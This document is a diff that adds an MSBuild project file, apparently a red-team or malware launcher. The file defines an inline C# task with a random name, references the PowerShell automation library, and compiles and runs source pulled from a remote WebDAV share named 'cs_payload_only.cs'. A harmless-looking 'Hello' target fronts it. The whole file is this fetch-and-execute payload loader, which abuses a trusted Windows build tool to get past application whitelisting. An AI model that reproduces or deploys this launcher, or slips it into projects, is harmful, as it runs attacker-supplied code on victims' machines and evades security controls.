@@ -1,0 +1,19 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hello">
+	   <KqTBOvLc />
+	  </Target>
+  <UsingTask
+	  TaskName="KqTBOvLc"
+	  TaskFactory="CodeTaskFactory"
+	  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	  <Task>
+		<Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
+		<Code 
+	 		Type="Class" 
+			Language="cs" 
+			Source="\\10.0.1.4\webdav\cs_payload_only.cs" >
+		</Code>
+	</Task>
+  </UsingTask>
+</Project>
+
